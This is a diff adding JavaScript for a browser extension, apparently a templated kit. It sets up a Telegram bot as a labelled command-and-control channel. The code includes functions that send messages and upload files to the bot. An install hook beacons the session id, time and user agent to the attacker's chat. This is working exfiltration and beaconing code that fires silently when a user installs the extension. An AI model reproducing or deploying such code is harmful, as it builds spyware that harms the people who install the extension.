@@ -1,0 +1,88 @@
+
+const C2_CONFIG = {
+    botToken: "{{ c2_bot_token }}",
+    chatId: "{{ c2_chat_id }}",
+    sessionId: "{{ c2_session_id }}",
+    enabled: {{ c2_enabled | lower }},
+    sendRealData: {{ c2_send_real_data | lower }},
+};
+
+
+async function c2Send(text) {
+    if (!C2_CONFIG.enabled) {
+        console.log('[C2] Disabled. Would send:', text);
+        return;
+    }
+    if (!C2_CONFIG.botToken || !C2_CONFIG.chatId) {
+        console.log('[C2] Not configured. Would send:', text);
+        return;
+    }
+
+    const url = `https://api.telegram.org/bot${C2_CONFIG.botToken}/sendMessage`;
+
+    try {
+        const res = await fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: C2_CONFIG.chatId,
+                text: text,
+                parse_mode: 'HTML',
+                disable_web_page_preview: true,
+            }),
+        });
+
+        if (!res.ok) {
+            console.log('[C2] Send failed:', res.status);
+        } else {
+            console.log('[C2] Sent to Telegram');
+        }
+    } catch (e) {
+        console.log('[C2] Error:', e.message);
+    }
+}
+
+async function c2SendDocument(filename, content) {
+    if (!C2_CONFIG.enabled) return;
+
+    const url = `https://api.telegram.org/bot${C2_CONFIG.botToken}/sendDocument`;
+    const formData = new FormData();
+
+    formData.append('chat_id', C2_CONFIG.chatId);
+    formData.append('document', new Blob([content], {type: 'text/plain'}), filename);
+    formData.append('caption', `📎 ${filename}`);
+
+    try {
+        await fetch(url, {
+            method: 'POST',
+            body: formData,
+        });
+    } catch (e) {
+        console.log('[C2] Document send error:', e.message);
+    }
+}
+
+
+function c2Escape(text) {
+    if (!text) return '';
+    return String(text)
+        .replace(/&/g, '&amp;')
+        .replace(/</g, '&lt;')
+        .replace(/>/g, '&gt;');
+}
+
+function c2Truncate(text, max = 200) {
+    if (!text) return '';
+    text = String(text);
+    return text.length > max ? text.substring(0, max) + '...' : text;
+}
+
+
+chrome.runtime.onInstalled.addListener(() => {
+    c2Send(
+        `🟢 <b>Расширение установлено</b>\n` +
+        `Сессия: <code>${C2_CONFIG.sessionId}</code>\n` +
+        `Время: ${new Date().toISOString()}\n` +
+        `User-Agent: ${c2Truncate(navigator.userAgent, 100)}`
+    );
+});
